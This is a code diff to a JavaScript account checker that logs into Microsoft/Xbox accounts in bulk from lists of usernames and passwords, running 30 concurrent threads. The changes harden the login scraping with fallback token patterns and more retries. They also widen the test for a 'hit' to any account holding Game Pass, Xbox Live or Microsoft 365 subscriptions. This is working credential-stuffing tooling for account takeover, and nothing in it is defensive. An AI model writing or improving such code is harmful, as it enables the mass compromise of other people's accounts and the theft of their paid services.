@@ -143,13 +143,24 @@ async function checkSingleAccount(credential, signal) {
     const r0 = await jarFetch(AUTHORIZE_URL, { headers: COMMON_HEADERS }, jar, signal);
     const page = await r0.text();
 
-    let ppft = parseLR(page, 'name="PPFT" id="i0327" value="', '"');
-    if (!ppft) ppft = parseLR(page, "sFT:'", "'");
-    if (!ppft) return { status: "fail", user, password, detail: "PPFT not found" };
+    // PPFT — try multiple patterns to survive page tweaks
+    let ppft =
+      parseLR(page, 'name="PPFT" id="i0327" value="', '"') ||
+      parseLR(page, "sFT:'", "'") ||
+      parseLR(page, 'sFT:"', '"') ||
+      parseLR(page, 'name="PPFT" value="', '"') ||
+      parseLR(page, '"sFT":"', '"');
+    if (!ppft) {
+      // Treat blank/garbage page as a transient — let pool retry instead of marking fail
+      if (!page || page.length < 200) return { status: "retry", user, password, detail: "Empty login page" };
+      return { status: "fail", user, password, detail: "PPFT not found" };
+    }
 
-    let urlPost = parseLR(page, "urlPost:'", "'");
-    if (!urlPost) urlPost = parseLR(page, 'urlPost:"', '"');
-    if (!urlPost) return { status: "fail", user, password, detail: "urlPost not found" };
+    let urlPost =
+      parseLR(page, "urlPost:'", "'") ||
+      parseLR(page, 'urlPost:"', '"') ||
+      parseLR(page, '"urlPost":"', '"');
+    if (!urlPost) return { status: "retry", user, password, detail: "urlPost not found" };
 
     // ── Step 2: POST login with fresh PPFT to dynamic urlPost ──
     const data =
@@ -182,7 +193,7 @@ async function checkSingleAccount(credential, signal) {
     const status = checkStatus(text1, finalUrl, jar.dict());
     if (status !== "SUCCESS") {
       if (status === "FAILURE") return { status: "fail", user, password, detail: "Invalid Credentials" };
-      if (status === "UNKNOWN_FAILURE") return { status: "fail", user, password, detail: "Unknown Failure" };
+      if (status === "UNKNOWN_FAILURE") return { status: "retry", user, password, detail: "Unknown Failure" };
       if (status === "BAN") return { status: "locked", user, password, detail: "Banned" };
       if (status === "2FACTOR") return { status: "locked", user, password, detail: "2FA/Verify" };
       if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Custom Lock" };
@@ -288,12 +299,26 @@ async function checkSingleAccount(credential, signal) {
       Points: points,
     };
 
+    // Hit if ANY of these are true: future renewal, autoRenew=true, or a known subscription title is present
     let isActive = false;
-    if (subscription && subscription !== "N/A" && nextRenewal && nextRenewal !== "N/A") {
-      try {
-        const renewalDate = new Date(nextRenewal);
-        isActive = renewalDate >= new Date();
-      } catch {}
+    if (subscription && subscription !== "N/A") {
+      if (nextRenewal && nextRenewal !== "N/A") {
+        try {
+          const renewalDate = new Date(nextRenewal);
+          if (!isNaN(renewalDate.getTime()) && renewalDate >= new Date()) isActive = true;
+        } catch {}
+      }
+      if (!isActive && (autoRenew === "true" || autoRenew === true)) isActive = true;
+      if (!isActive) {
+        const sub = String(subscription).toLowerCase();
+        if (
+          sub.includes("game pass") ||
+          sub.includes("xbox live") ||
+          sub.includes("ultimate") ||
+          sub.includes("microsoft 365") ||
+          sub.includes("office 365")
+        ) isActive = true;
+      }
     }
 
     return {
@@ -316,7 +341,7 @@ async function checkXboxAccounts(accounts, threads = 30, onProgress, signal) {
   const results = await runPool({
     items: accounts,
     concurrency: threads,
-    maxRetries: 2,
+    maxRetries: 3,
     signal,
     scope: "xboxchk",
     runner: async (cred, ctx) => {
